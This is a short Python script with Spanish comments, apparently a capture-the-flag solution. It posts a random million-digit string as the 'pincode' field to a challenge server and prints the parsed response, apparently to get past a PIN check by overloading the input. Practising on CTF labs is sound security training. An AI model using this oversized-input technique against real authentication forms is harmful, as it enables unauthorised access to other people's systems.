import requests
from bs4 import BeautifulSoup
import random

URL = "http://challs.latam-ctf.cybersecnatlab.it:1341/" 

# Esta funcion es para generar una cadena de numeros con una longitud enviada por parametros que sera bastante grande
def generate_random_number_string(length): 
    return ''.join(random.choices('0123456789', k=length))


def check_pin():
    # Generamos una cadena bastante grande de 10^6
    random_number_string = generate_random_number_string(10**6)

    # enviamos la solicitud desde POST enviando como pincode la cadena larga
    response = requests.post(URL, data={"pincode": random_number_string})

    # Parseamos todo el codigo del HTTP Response
    soup = BeautifulSoup(response.text, "html.parser")

    # Y mostramos el texto salida
    print(soup.get_text())

check_pin()
